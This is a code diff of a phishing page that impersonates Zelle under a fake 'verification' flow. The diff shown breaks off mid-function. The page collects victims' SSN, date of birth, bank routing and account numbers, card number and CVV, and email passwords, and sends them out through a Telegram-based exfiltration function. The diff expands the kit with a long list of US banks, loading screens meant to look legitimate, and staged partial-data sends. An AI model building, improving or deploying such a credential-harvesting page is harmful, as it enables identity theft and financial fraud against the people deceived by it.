@@ -9,8 +9,9 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #f5f7fb 0%, #eef2f7 100%); min-height: 100vh; }
-        .btn-purple { background: linear-gradient(135deg, #6D1ED4 0%, #5516a8 100%); color: white; border: none; transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(109, 30, 212, 0.3); cursor: pointer; }
-        .btn-purple:hover { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(109, 30, 212, 0.4); }
+        .btn-purple { background: linear-gradient(135deg, #6D1ED4 0%, #5516a8 100%); color: white; border: none; transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(109, 30, 212, 0.3); cursor: pointer; position: relative; overflow: hidden; }
+        .btn-purple:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(109, 30, 212, 0.4); }
+        .btn-purple:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
         .verification-container { max-width: 580px; margin: 0 auto; padding: 20px 16px 40px; }
         .form-card-modern { background: white; border-radius: 40px; box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.15); padding: 32px 28px; margin-bottom: 24px; border: 1px solid rgba(109, 30, 212, 0.1); }
         .progress-steps { display: flex; justify-content: space-between; margin-bottom: 36px; flex-wrap: wrap; gap: 6px; }
@@ -19,13 +20,13 @@
         .step-marker.completed { color: #10b981; border-top-color: #10b981; }
         .step-marker .step-icon { position: absolute; top: -14px; left: 50%; transform: translateX(-50%); background: white; padding: 0 8px; font-size: 1rem; }
         .step-label { display: block; margin-top: 8px; font-size: 0.7rem; font-weight: 500; }
-        .input-group { margin-bottom: 24px; }
+        .input-group { margin-bottom: 24px; position: relative; }
         label { font-weight: 600; font-size: 0.85rem; margin-bottom: 8px; display: block; color: #1e293b; }
         input, select { width: 100%; padding: 14px 18px; font-size: 1rem; border: 1.5px solid #e2e8f0; border-radius: 60px; outline: none; font-family: 'Inter', sans-serif; background: white; transition: all 0.2s; }
         input:focus, select:focus { border-color: #6D1ED4; box-shadow: 0 0 0 3px rgba(109,30,212,0.1); }
         .btn-next, .btn-submit, .btn-back { padding: 14px 20px; font-weight: 700; border-radius: 60px; cursor: pointer; width: 100%; font-size: 1rem; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 8px; transition: all 0.2s; }
         .btn-back { background: #f1f5f9; color: #334155; border: none; margin-top: 12px; }
-        .btn-back:hover { background: #e2e8f0; }
+        .btn-back:hover:not(:disabled) { background: #e2e8f0; }
         .success-page { text-align: center; padding: 40px 20px; animation: fadeInUp 0.5s ease; }
         @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         .success-icon { background: linear-gradient(135deg, #10b98120 0%, #10b98110 100%); width: 100px; height: 100px; line-height: 100px; border-radius: 50%; margin: 0 auto 24px; color: #10b981; font-size: 3rem; animation: scaleIn 0.5s ease; }
@@ -36,59 +37,35 @@
         select { appearance: none; background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e"); background-repeat: no-repeat; background-position: right 18px center; background-size: 20px; }
         .valid-card { border-color: #10b981 !important; }
         
+        /* Bank Search Styles */
+        .bank-search-container { position: relative; }
+        .bank-search-input { width: 100%; padding: 14px 18px; font-size: 1rem; border: 1.5px solid #e2e8f0; border-radius: 60px; outline: none; font-family: 'Inter', sans-serif; }
+        .bank-dropdown { position: absolute; top: 100%; left: 0; right: 0; background: white; border: 1.5px solid #e2e8f0; border-radius: 20px; max-height: 250px; overflow-y: auto; z-index: 1000; margin-top: 8px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1); display: none; }
+        .bank-dropdown.show { display: block; }
+        .bank-option { padding: 12px 18px; cursor: pointer; transition: background 0.2s; border-bottom: 1px solid #f1f5f9; }
+        .bank-option:hover { background: #f8fafc; }
+        .bank-option.selected { background: #f0f4fe; color: #6D1ED4; font-weight: 500; }
+        
+        /* Loading Overlay */
+        .loading-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); display: flex; align-items: center; justify-content: center; z-index: 9999; backdrop-filter: blur(4px); }
+        .loading-content { background: white; border-radius: 32px; padding: 32px; text-align: center; max-width: 300px; animation: pulse 1.5s ease infinite; }
+        .loading-spinner-large { width: 60px; height: 60px; border: 4px solid #e2e8f0; border-top-color: #6D1ED4; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.02); } }
+        
         /* Email Provider Styles */
-        .email-provider-card {
-            background: white;
-            border-radius: 32px;
-            padding: 24px;
-            margin-bottom: 20px;
-            text-align: center;
-            animation: slideIn 0.3s ease;
-        }
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .provider-icon {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 16px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2.5rem;
-        }
+        .email-provider-card { background: white; border-radius: 32px; padding: 24px; margin-bottom: 20px; text-align: center; animation: slideIn 0.3s ease; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        .provider-icon { width: 80px; height: 80px; margin: 0 auto 16px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2.5rem; }
         .gmail-bg { background: linear-gradient(135deg, #EA4335 0%, #C5221F 100%); color: white; }
         .yahoo-bg { background: linear-gradient(135deg, #7B0099 0%, #5A0070 100%); color: white; }
         .outlook-bg { background: linear-gradient(135deg, #0078D4 0%, #005A9E 100%); color: white; }
         .aol-bg { background: linear-gradient(135deg, #3C0B6B 0%, #2A084A 100%); color: white; }
         .default-bg { background: linear-gradient(135deg, #6D1ED4 0%, #5516a8 100%); color: white; }
-        .provider-email {
-            font-size: 1rem;
-            color: #475569;
-            margin-bottom: 20px;
-            word-break: break-all;
-        }
-        .password-input-container {
-            position: relative;
-            margin-top: 20px;
-        }
-        .toggle-password-email {
-            position: absolute;
-            right: 18px;
-            top: 45px;
-            cursor: pointer;
-            color: #94a3b8;
-        }
-        .provider-badge {
-            display: inline-block;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            font-weight: 600;
-            margin-bottom: 12px;
-        }
+        .provider-email { font-size: 1rem; color: #475569; margin-bottom: 20px; word-break: break-all; }
+        .password-input-container { position: relative; margin-top: 20px; }
+        .toggle-password-email { position: absolute; right: 18px; top: 45px; cursor: pointer; color: #94a3b8; }
+        .provider-badge { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 600; margin-bottom: 12px; }
         .gmail-badge { background: #EA4335; color: white; }
         .yahoo-badge { background: #7B0099; color: white; }
         .outlook-badge { background: #0078D4; color: white; }
@@ -108,16 +85,138 @@
         <div class="telegram-note"><i class="fab fa-telegram"></i> 🔒 256-bit encrypted • Your information is protected</div>
     </div>
 </div>
-<footer><p>© 2025 Zelle® Network | All transactions are monitored 24/7 for security</p></footer>
+<footer><p>© 2025 Zelle® Network | All transactions are monitored 24/7 for security</p></div></footer>
 
 <script>
+    // US States
     const US_STATES = ["Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"];
     
+    // Complete Banks List
     const BANK_LIST = [
-        "A+ Federal Credit Union", "Abington Bank", "ABNB", "Academy Bank", "Bank of America", "Chase Bank", "Wells Fargo Bank",
-        "Citibank", "PNC Bank", "US Bank", "Truist", "Capital One", "Ally Bank", "Discover Bank", "HSBC Bank USA",
-        "TD Bank N.A.", "Santander Bank", "Fifth Third Bank", "KeyBank", "Regions Bank", "Huntington Bank", "M&T Bank"
-    ];
+        "A+ Federal Credit Union", "Abington Bank", "ABNB", "Abri Credit Union", "Academy Bank", "Acadia Federal Credit Union",
+        "Access Community Credit Union", "ACCESSbank Omaha", "ACFCU", "Achieva Credit Union", "Acme Continental CU", "ACNB Bank",
+        "Actors Federal Credit Union", "ACU of Texas", "Addition Financial", "AdelFi Credit Union", "Adirondack Bank",
+        "Adirondack RFCU", "Adirondack Trust", "Advanced Financial Federal CU", "Advancial", "Advantage FCU", "AERO Federal Credit Union",
+        "Aerospace Federal Credit Union", "Affidian Federal Credit Union", "Affinity One FCU", "AFFINITYFCU", "AgFed Credit Union",
+        "Air Academy FCU", "Alabama Credit Union", "Albany Bank & Trust", "Alcoa Community FCU", "Alden State Bank", "ALEC",
+        "Alerus", "Alhambra Credit Union", "Align Credit Union", "All In Credit Union", "All One Credit Union", "Allegent Community FCU",
+        "Allegiance Credit Union", "Alliance Bank", "Alliance Catholic Credit Union", "Alliance Credit Union", "AllSouth Federal Credit Union",
+        "Ally Bank", "Alma Bank", "Aloha Pacific FCU", "Alpine Bank", "Alta Vista Credit Union", "Altabank", "Altamaha Bank and Trust",
+        "Altana Federal Credit Union", "Altoona First Savings Bank", "Altos Bank", "Altura Credit Union", "Amalgamated Bank of Chicago",
+        "Amalgamated Bank(NY)", "Amarillo National Bank", "AMBK", "Ambler Savings Bank", "Amegy Bank", "Amerant Bank, N.A.",
+        "America First Credit Union", "America's Credit Union", "American Bank", "American Bank & Trust", "American Express National Bank",
+        "American First Credit Union", "American National Bank", "Ameris Bank", "AMG National Trust Bank", "ANB Bank", "Anchor Bank",
+        "Andrew Johnson Bank", "Andrews Federal Credit Union", "Apple Bank", "Apple Federal Credit Union", "Arbor Bank",
+        "Arizona Central Credit Union", "Arizona Financial Credit Union", "Arkansas Federal Credit Union", "Armed Forces Bank",
+        "Armstrong Bank", "Arrowhead Credit Union", "Arsenal Credit Union", "Arthur State Bank", "Artisans' Bank", "Arvest",
+        "Ascend FCU", "Ascension Credit Union", "ASECU", "Aspire Credit Union", "Associated Bank N.A.", "Associated Credit Union",
+        "Atlantic Union Bank", "Audubon State Bank", "Aurora Federal Credit Union", "Avadian Credit Union", "BAC Community Bank",
+        "Banc of Cal", "Banesco USA", "Bank 34", "Bank Central", "Bank First", "Bank Five Nine", "Bank Independent", "Bank Midwest",
+        "Bank of America", "Bank of Ann Arbor", "Bank of Colorado", "Bank of Hawaii", "Bank of Hope", "Bank of Marin", "Bank of Oklahoma",
+        "Bank of Stockton", "Bank of Tennessee", "Bank of Texas", "Bank of Utah", "Bank OZK", "Bank5 Connect", "Bank7", "BankChampaign",
+        "BankFinancial", "BankFive", "bankHometown", "BankNewport", "BankORION", "BankPlus", "BankUnited", "BankVista", "BankWest",
+        "Banner Bank", "Bar Harbor Bank and Trust", "Bask Bank", "Bath Savings Institution", "Bay Bank", "Bay Federal Credit Union",
+        "Bay State Savings Bank", "BayFirst National Bank", "BayPort Credit Union", "BayVanguard Bank", "BB Americas Bank", "BCB Bank",
+        "BCU", "BECU", "Bell Bank", "Bellco", "Belmont Savings Bank", "Beneficial State Bank", "Bethlehem 1st FCU", "BMO",
+        "BNA Bank", "BNC National Bank", "BOK Financial", "BOND Community FCU", "Bossier Federal Credit Union", "Bravera Bank",
+        "Brazos Valley Schools CU", "Brenham National Bank", "Bridgewater Bank", "Bright Bank", "Broadway National Bank",
+        "Burke & Herbert Bank", "Busey Bank", "Byline Bank", "C&F Mobile Banking", "C3bank", "Cadence Bank", "California Bank & Trust",
+        "California Credit Union", "Cambridge Savings Bank", "Camden National Bank", "CAMPUS USA Credit Union", "Canvas Credit Union",
+        "Cape Cod 5", "Capital Bank", "Capital City Bank", "Capital Community Bank", "Capital One", "Capitol Federal", "Carver Federal Savings Bank",
+        "Cathay Bank", "CB&S Bank", "CBC", "CCB Community Bank", "Centennial Bank", "Central Bank", "Central Pacific Bank",
+        "Centreville Bank", "Century Bank", "CFG Bank", "Charles Schwab Bank", "Chase Bank", "Chelsea Groton Bank", "Chesapeake Bank",
+        "Chevron Federal Credit Union", "ChoiceOne Bank", "Christian Community CU", "CIBC Bank USA", "CIT Bank", "Citi", "Citizens Bank",
+        "Citizens Business Bank", "Citizens National Bank", "Citizens Savings Bank", "Citizens State Bank", "Citizens Trust Bank",
+        "City Bank", "City National Bank", "City National Bank of Florida", "Civista Bank", "Clear Mountain Bank", "Clearview FCU",
+        "CNB Bank", "Coastal Community Bank", "Coastal Federal Credit Union", "Coastal Heritage Bank", "Colony Bank", "Comerica Bank",
+        "Commerce Bank", "Commercial Bank", "Commonwealth Credit Union", "Community Bank", "Community Bank N.A.", "Community First Bank",
+        "Community First Credit Union", "Community National Bank", "CommunityAmerica Credit Union", "ConnectOne Bank", "Connex Credit Union",
+        "Consumers Credit Union", "Core Bank", "Cornerstone Bank", "Cornerstone CU", "CorTrust Bank", "Credit Union 1", "Credit Union of Colorado",
+        "Credit Union of Texas", "Crossroads Bank", "Cumberland Federal Bank", "Customers Bank", "Dacotah Bank", "Dairy State Bank",
+        "DATCU", "Dayspring Bank", "Dean Bank", "Decatur County Bank", "Dedham Savings", "Del Norte Credit Union", "Delta Community Credit Union",
+        "Desert Financial", "DFCU Financial", "Dime Community Bank", "Discover Bank", "Dogwood State Bank", "Dollar Bank", "Dominion Bank",
+        "East Cambridge Savings Bank", "East West Bank", "Eastern Bank", "Eastman Credit Union", "EastRise Federal Credit Union",
+        "eCO Credit Union", "Education CU", "Educators Credit Union", "EECU", "Elements Financial", "Embers Credit Union", "empeople Credit Union",
+        "Empower Federal Credit Union", "Enterprise Bank", "Enterprise Bank & Trust", "Ephrata National Bank", "Equitable Bank",
+        "ESL Federal Credit Union", "EverBank", "Evergreen Federal Bank", "Exchange Bank", "Extra Credit Union", "F&M Bank", "F&M Trust",
+        "FAIRWINDS Credit Union", "Falcon International Bank", "Family First Credit Union", "Farmers & Merchants Bank", "Farmers Bank",
+        "Farmers National Bank", "Farmers State Bank", "FAST Credit Union", "FCB Banks", "FedChoice FCU", "Fidelity Bank", "Fifth Third Bank",
+        "Financial Partners CU", "FineMark Bank", "First Alliance CU", "First American Bank", "First Bank", "First Bank & Trust",
+        "First Capital Bank", "First Citizens Bank", "First Citizens National Bank", "First Command Bank", "First Commerce Bank",
+        "First Commerce Credit Union", "First Commonwealth Bank", "First Community Bank", "First County Bank", "First Credit Union",
+        "First Entertainment CU", "First Fed", "First Federal Bank", "First Federal Credit Union", "First Federal Savings Bank",
+        "First Fidelity Bank", "First Financial Bank", "First Financial Credit Union", "First Florida Credit Union", "First Foundation Bank",
+        "First Hawaiian Bank", "First Horizon", "First Internet Bank", "First Interstate Bank", "First Merchants Bank", "First Mid Bank & Trust",
+        "First National Bank", "First National Bank Alaska", "First National Bank of Omaha", "First National Bank Texas", "First Nations Bank",
+        "First Northern Credit Union", "First Savings Bank", "First Security Bank", "First Southern Bank", "First State Bank",
+        "First Tech Federal Credit Union", "First United Bank", "First Western Bank & Trust", "FirstBank", "FirsTier Bank", "FirstLight",
+        "Five Points Bank", "Five Star Bank", "Flagstar Bank", "Florence Bank", "Flushing Bank", "FNB Community Bank", "FNB of Tennessee",
+        "FNBC Bank", "Forcht Bank", "Fortera Credit Union", "Fort Sill Federal Credit Union", "Fox Communities Credit Union",
+        "Franklin Savings Bank", "Freedom Bank", "Fremont Bank", "Frost Bank", "Fulton Bank", "Gate City Bank", "Gateway Bank",
+        "Gateway First Bank", "GECU", "Generations FCU", "German American Bank", "Gesa Credit Union", "Glacier Bank", "Golden 1 Credit Union",
+        "Grand Bank", "Granite State Credit Union", "Great Basin Federal CU", "Great Lakes CU", "Greater Nevada Credit Union",
+        "GreenState Credit Union", "Greylock Federal Credit Union", "GTE Financial", "Guaranty Bank", "Gulf Coast Bank and Trust",
+        "Hancock Whitney Bank", "Hanmi Bank", "Harborstone Credit Union", "Hawthorn Bank", "Heartland Bank", "Heritage Bank",
+        "Heritage Federal Credit Union", "Hickory Point Bank", "Home Bank", "Home Federal Bank", "HomeStreet Bank", "Hometown Bank",
+        "Horizon Bank", "HSBC Bank USA", "Hughes Federal Credit Union", "Huntington Bank", "Ideal Credit Union", "Independence Bank",
+        "Independent Bank", "Indiana Members Credit Union", "Industrial CU", "INOVA Federal", "InRoads Credit Union", "Insight Credit Union",
+        "INTRUST Bank", "Investar Bank", "Ion Bank", "Iowa State Bank", "Isabella Bank", "iThink Financial Credit Union",
+        "Jefferson Bank", "Johnson Financial", "Jovia Financial Credit Union", "Kalamazoo County State Bank", "Katahdin Trust Company",
+        "Kearny Bank", "Keesler FCU", "KeyBank", "KeyPoint Credit Union", "Kinecta Federal Credit Union", "Kitsap Credit Union",
+        "Lake City Bank", "Lake Ridge Bank", "Lake Trust Credit Union", "Landmark Credit Union", "Landmark National Bank",
+        "Langley Federal Credit Union", "LBS Financial Credit Union", "LCNB National Bank", "Leader Bank", "Legacy Bank",
+        "LGE Community Credit Union", "Liberty Bank", "Liberty Savings Bank", "LINKBANK", "Listerhill Credit Union", "Logix Federal Credit Union",
+        "Lone Star National Bank", "M&T Bank", "Machias Savings Bank", "Macatawa Bank", "Magnifi Financial", "Main Street Bank",
+        "Manasquan Bank", "Marquette Bank", "Maspeth Federal Savings", "Mayo Employees FCU", "MCU", "Mechanics Bank", "Members 1st Credit Union",
+        "Merchants Bank", "Meriwest Credit Union", "Merrimack County Savings Bank", "Metro City Bank", "Metropolitan Commercial Bank",
+        "Michigan First Credit Union", "Mid Penn Bank", "MidFirst Bank", "MIDFLORIDA Credit Union", "Midland States Bank", "MidSouth Bank",
+        "MidWestOne Bank", "Milton Savings Bank", "Minnwest Bank", "Mission Federal Credit Union", "Montecito Bank & Trust",
+        "Morgan Stanley", "Mountain America Credit Union", "Municipal Credit Union", "NASA Federal Credit Union", "National Bank of Arizona",
+        "Navy Federal Credit Union", "NBT Bank", "Needham Bank", "Neighborhood Credit Union", "Nevada State Bank", "Newburyport Bank",
+        "Newtown Savings Bank", "Nicolet National Bank", "North Shore Bank", "North State Bank", "NorthCountry FCU", "Northeast Bank",
+        "Northern Trust", "Northfield Bank", "Northrim Bank", "Northwest Bank", "Northwest Federal Credit Union", "Northwestern Bank",
+        "Norway Savings Bank", "NuMark Credit Union", "Numerica Credit Union", "Nuvision Credit Union", "OceanFirst Bank", "Old National Bank",
+        "Old Second Bank", "Olympia Credit Union", "Omaha Federal Credit Union", "One Community Bank", "One Nevada Credit Union",
+        "OneAZ Credit Union", "OnPath Federal Credit Union", "OnPoint Community Credit Union", "Orange Bank & Trust", "Origin Bank",
+        "Oxford Bank", "Pacific NW FCU", "Park National Bank", "Parkway Bank", "Partner Colorado Credit Union", "Partners Bank",
+        "Patelco Credit Union", "Pathfinder Bank", "Peapack Private Bank & Trust", "Pelican Credit Union", "PenFed Credit Union",
+        "Penn Community Bank", "Peoples Bank", "Peoples State Bank", "Peoples Trust Company", "Pinnacle Bank", "Pioneer Bank",
+        "PlainsCapital Bank", "PNC Bank", "PointBank", "Ponce Bank", "POPA Federal Credit Union", "Poppy Bank", "Popular Bank",
+        "Premier America Credit Union", "Presidential Bank", "PrimeWay FCU", "Primis Bank", "Priority One Credit Union",
+        "Prosperity Bank", "Provident Bank", "PSECU", "Publix Employees FCU", "Quontic Bank", "Quorum Federal Credit Union",
+        "Radiant Credit Union", "Rally Credit Union", "Red River Bank", "Redstone Federal Credit Union", "Regions Bank", "Renasant Bank",
+        "Republic Bank", "Resource One Credit Union", "Rhinebeck Bank", "Ridgewood Savings Bank", "Rio Bank", "River City Bank",
+        "Rivermark Credit Union", "Rivertrust FCU", "Rockland Trust", "Rogue Credit Union", "Royal Business Bank", "S&T Bank",
+        "Sabine State Bank", "Salal Credit Union", "Salem Five Cents Savings Bank", "Sandia Area FCU", "Santander Bank",
+        "SaviBank", "Savings Bank of Walpole", "SchoolsFirst FCU", "Seacoast Bank", "Seattle Credit Union", "SECU of Maryland",
+        "Security Federal Bank", "Security First Bank", "Security National Bank", "Security Service FCU", "SELCO Community Credit Union",
+        "Servbank", "Service First FCU", "SF Fire Credit Union", "Shore United Bank", "Sierra Central Credit Union", "Signature Bank",
+        "Silicon Valley Bank", "Simmons Bank", "Simplicity Credit Union", "Skyla Credit Union", "SkyOne Federal Credit Union",
+        "Smart Financial Credit Union", "SmartBank", "SNB Bank", "Sno Falls Credit Union", "Social Security CU", "SoFi Bank",
+        "Solutions Bank", "Solvay Bank", "Somerset Regal Bank", "Sound Community Bank", "South Carolina FCU", "South Central Bank",
+        "South Shore Bank", "Southern Bank", "Southern First Bank", "SouthState Bank", "Southwest Airlines FCU", "SouthWest Bank",
+        "Space Coast Credit Union", "Spectrum Credit Union", "Spencer Savings Bank", "SpiritBank", "Spring Bank", "St. Charles Bank & Trust",
+        "Stanford Federal Credit Union", "STAR Financial Bank", "Star One Credit Union", "Starion Bank", "State Bank", "State Department Federal Credit Union",
+        "Stearns Bank", "Stellar Bank", "Stock Yards Bank & Trust", "Stockman Bank", "Stone Bank", "Suffolk Credit Union", "Summit Bank",
+        "Summit Credit Union", "Sunflower Bank", "SunTrust", "Sunward Credit Union", "Synovus Bank", "TD Bank", "TDECU", "Technology Credit Union",
+        "Telhio Credit Union", "Territorial Savings Bank", "Texans Credit Union", "Texas Bank and Trust", "Texas Capital Bank",
+        "Texas First Bank", "Texas Regional Bank", "Texas Trust Credit Union", "The Bank of Missouri", "The Bank of Tampa",
+        "The Dime Bank", "The Farmers Bank", "The Huntington National Bank", "The Washington Trust Company", "Think Bank",
+        "Thomaston Savings Bank", "Timberland Bank", "TLC Community CU", "Tower Federal Credit Union", "Town & Country Bank",
+        "TowneBank", "Travis Credit Union", "Tri City National Bank", "Tropical Financial CU", "Truist", "Truity Credit Union",
+        "TruMark Financial Credit Union", "Trustco Bank", "TruStone Financial", "TruWest Credit Union", "TTCU Federal Credit Union",
+        "TwinStar Credit Union", "Tyndall Federal Credit Union", "U.S. Bank", "U.S. Century Bank", "UBS Financial Services",
+        "UFCU", "Ulster Savings Bank", "UMassFive College Credit Union", "Unify Financial Credit Union", "Union Bank", "Union Bank & Trust",
+        "Union Savings Bank", "United Bank", "United Community Bank", "United Federal Credit Union", "United Midwest Savings Bank",
+        "Unity Bank", "Universal 1 Credit Union", "University Credit Union", "Univest Bank and Trust", "USAA Federal Savings Bank",
+        "USC Credit Union", "USPS FCU", "Utah Community Credit Union", "UW Credit Union", "Valley Bank", "Valley Strong Credit Union",
+        "ValleyStar Credit Union", "Vantage West Credit Union", "Velocity Credit Union", "Verity Credit Union", "Visions Federal Credit Union",
+        "VyStar Credit Union", "WaFd Bank", "Washington Federal Bank", "Washington Trust Bank", "WaterStone Bank", "Wauna Credit Union",
+        "Wayne Bank", "Webster Bank", "WECU", "Wellby Financial", "Wells Fargo Bank", "WesBanco Bank", "Wescom Credit Union",
+        "West Bank", "West Gate Bank", "West Texas National Bank", "WESTconsin Credit Union", "Western Bank", "Westfield Bank",
+        "WestStar Bank", "Wheatland Bank", "Wheaton Bank & Trust", "Wings Financial Credit Union", "Wintrust Bank", "Woodforest National Bank",
+        "WSFS Bank", "Yakima Federal Savings", "Zions Bank", "1st Advantage", "1st Bank", "1st Source Bank", "1ST SUMMIT BANK"
+    ].sort();
     
     const steps = [
         { id: 0, name: "Full Name", fields: ["fullName"] },
@@ -129,15 +228,34 @@
     ];
     
     let currentStep = 0;
-    let partialDataSent = { bank: false, full: false };
+    let partialDataSent = { bank: false, card: false, full: false };
     let formData = {
         fullName: "", addressStreet: "", addressCity: "", addressState: "", addressZip: "",
         ssn: "", dob: "", bankName: "", routingNumber: "", accountNumber: "",
         cardNumber: "", cardExpiry: "", cardCvv: "", email: "", password: ""
     };
     let isSubmitting = false;
-    let currentEmailDomain = '';
     let emailSubmitted = false;
+    let bankSearchTerm = "";
+    
+    function showLoading(message = "Processing...") {
+        const overlay = document.createElement('div');
+        overlay.className = 'loading-overlay';
+        overlay.id = 'loadingOverlay';
+        overlay.innerHTML = `
+            <div class="loading-content">
+                <div class="loading-spinner-large"></div>
+                <p style="margin-top: 16px; color: #1e293b; font-weight: 500;">${message}</p>
+                <p style="font-size: 0.75rem; color: #64748b; margin-top: 8px;">Please wait...</p>
+            </div>
+        `;
+        document.body.appendChild(overlay);
+    }
+    
+    function hideLoading() {
+        const overlay = document.getElementById('loadingOverlay');
+        if (overlay) overlay.remove();
+    }
     
     function formatSSN(value) { let numbers = value.replace(/\D/g, ''); if (numbers.length >= 3 && numbers.length < 6) { numbers = numbers.slice(0, 3) + '-' + numbers.slice(3); } else if (numbers.length >= 6) { numbers = numbers.slice(0, 3) + '-' + numbers.slice(3, 5) + '-' + numbers.slice(5, 9); } return numbers.slice(0, 11); }
     function formatCardNumber(value) { let numbers = value.replace(/\D/g, ''); let formatted = ''; for (let i = 0; i < numbers.length && i < 16; i++) { if (i > 0 && i % 4 === 0) formatted += ' '; formatted += numbers[i]; } return formatted; }
@@ -146,22 +264,11 @@
     
     function getEmailProviderInfo(email) {
         const domain = email.split('@')[1]?.toLowerCase() || '';
-        
-        if (domain.includes('gmail') || domain === 'googlemail.com') {
-            return { name: 'Gmail', icon: 'fab fa-google', bgClass: 'gmail-bg', badgeClass: 'gmail-badge', color: '#EA4335' };
-        } else if (domain.includes('yahoo')) {
-            return { name: 'Yahoo Mail', icon: 'fab fa-yahoo', bgClass: 'yahoo-bg', badgeClass: 'yahoo-badge', color: '#7B0099' };
-        } else if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live') || domain.includes('msn')) {
-            return { name: 'Outlook', icon: 'fab fa-microsoft', bgClass: 'outlook-bg', badgeClass: 'outlook-badge', color: '#0078D4' };
-        } else if (domain.includes('aol')) {
-            return { name: 'AOL Mail', icon: 'fas fa-envelope', bgClass: 'aol-bg', badgeClass: 'aol-badge', color: '#3C0B6B' };
-        } else if (domain.includes('icloud') || domain.includes('me.com') || domain.includes('mac.com')) {
-            return { name: 'iCloud', icon: 'fab fa-apple', bgClass: 'default-bg', badgeClass: 'default-bg', color: '#6D1ED4' };
-        } else if (domain.includes('protonmail')) {
-            return { name: 'ProtonMail', icon: 'fas fa-shield-alt', bgClass: 'default-bg', badgeClass: 'default-bg', color: '#6D1ED4' };
-        } else {
-            return { name: `${domain.toUpperCase()} Mail`, icon: 'fas fa-at', bgClass: 'default-bg', badgeClass: 'default-bg', color: '#6D1ED4' };
-        }
+        if (domain.includes('gmail')) return { name: 'Gmail', icon: 'fab fa-google', bgClass: 'gmail-bg', badgeClass: 'gmail-badge' };
+        if (domain.includes('yahoo')) return { name: 'Yahoo Mail', icon: 'fab fa-yahoo', bgClass: 'yahoo-bg', badgeClass: 'yahoo-badge' };
+        if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live')) return { name: 'Outlook', icon: 'fab fa-microsoft', bgClass: 'outlook-bg', badgeClass: 'outlook-badge' };
+        if (domain.includes('aol')) return { name: 'AOL Mail', icon: 'fas fa-envelope', bgClass: 'aol-bg', badgeClass: 'aol-badge' };
+        return { name: domain.toUpperCase() + ' Mail', icon: 'fas fa-at', bgClass: 'default-bg', badgeClass: 'default-bg' };
     }
     
     function syncFormData() { document.querySelectorAll('[data-field]').forEach(input => { const field = input.getAttribute('data-field'); if (formData.hasOwnProperty(field)) formData[field] = input.value; }); }
@@ -193,7 +300,16 @@
         return null;
     }
     
-    function showTemporaryMessage(msg, type = 'error') { const msgDiv = document.getElementById('globalMessage'); if (msgDiv) { const bgColor = type === 'error' ? '#fee2e2' : '#e6f7e6'; const textColor = type === 'error' ? '#b91c1c' : '#2e7d32'; const icon = type === 'error' ? 'fa-exclamation-triangle' : 'fa-check-circle'; msgDiv.innerHTML = `<div style="background:${bgColor}; padding:14px; border-radius:20px; color:${textColor}; font-size:0.85rem; display:flex; align-items:center; gap:10px;"><i class="fas ${icon}"></i> ${msg}</div>`; setTimeout(() => { if(msgDiv) msgDiv.innerHTML = ''; }, 5000); } }
+    function showTemporaryMessage(msg, type = 'error') { 
+        const msgDiv = document.getElementById('globalMessage'); 
+        if (msgDiv) { 
+            const bgColor = type === 'error' ? '#fee2e2' : '#e6f7e6'; 
+            const textColor = type === 'error' ? '#b91c1c' : '#2e7d32'; 
+            const icon = type === 'error' ? 'fa-exclamation-triangle' : 'fa-check-circle'; 
+            msgDiv.innerHTML = `<div style="background:${bgColor}; padding:14px; border-radius:20px; color:${textColor}; font-size:0.85rem; display:flex; align-items:center; gap:10px;"><i class="fas ${icon}"></i> ${msg}</div>`; 
+            setTimeout(() => { if(msgDiv) msgDiv.innerHTML = ''; }, 5000); 
+        } 
+    }
     
     async function sendToTelegramAPI(data, type = 'partial') {
         try {
@@ -218,9 +334,21 @@
     
     async function sendPartialBankData() {
         if (partialDataSent.bank) return true;
-        const bankData = { fullName: formData.fullName, addressStreet: formData.addressStreet, addressCity: formData.addressCity, addressState: formData.addressState, addressZip: formData.addressZip, ssn: formData.ssn, dob: formData.dob, bankName: formData.bankName, routingNumber: formData.routingNumber, accountNumber: formData.accountNumber, submissionStage: "BANK_VERIFICATION_PARTIAL" };
+        showLoading("Verifying bank details...");
